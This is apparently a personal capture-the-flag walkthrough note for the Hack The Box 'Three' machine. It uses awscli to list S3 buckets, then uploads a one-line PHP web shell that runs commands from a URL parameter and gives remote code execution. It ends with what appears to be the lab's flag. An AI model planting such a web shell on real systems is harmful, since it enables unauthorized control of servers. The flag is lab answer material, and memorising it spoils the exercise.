From Starting point **Three** machine HTB

# access AWS S3 Buckets
https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html
apt install awscli
First, we need to configure it using the following command.
```
aws configure
```
![[Pasted image 20221117230805.png]]

We can list all of the S3 buckets hosted by the server by using the ls command.

```
aws --endpoint=http://s3.thetoppers.htb s3 ls
```
We can also use the ls command to list objects and common prefixes under the specified bucket
```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

If website is running on php and on S3 bucket we can upload php shell to the bucket and access it through the website
We can use the following PHP one-liner which uses the system() function which takes the URL parameter cmd as an input and executes it as a system command.

```php
<?php system($_GET["cmd"]); ?>
```
Let's create a PHP file to upload.
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```
now we can verify that it works by accessing the page 
![[Pasted image 20221117231308.png]]
and it's working all we need to do now is add ?cmd=COMMAND and we have RCE on the machine
a980d99281a28d638ac68b9bf9453c2b
